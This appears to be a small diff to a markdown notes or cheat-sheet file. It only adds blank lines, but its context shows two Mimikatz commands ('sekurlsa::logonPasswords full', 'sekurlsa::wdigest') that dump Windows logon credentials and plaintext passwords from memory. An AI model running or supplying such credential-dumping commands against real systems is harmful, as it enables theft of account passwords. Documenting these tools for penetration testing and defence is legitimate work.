@@ -20,3 +20,5 @@ mimikatz_command -f sekurlsa::logonPasswords full
 mimikatz_command -f sekurlsa::wdigest
 
 ```
+
+
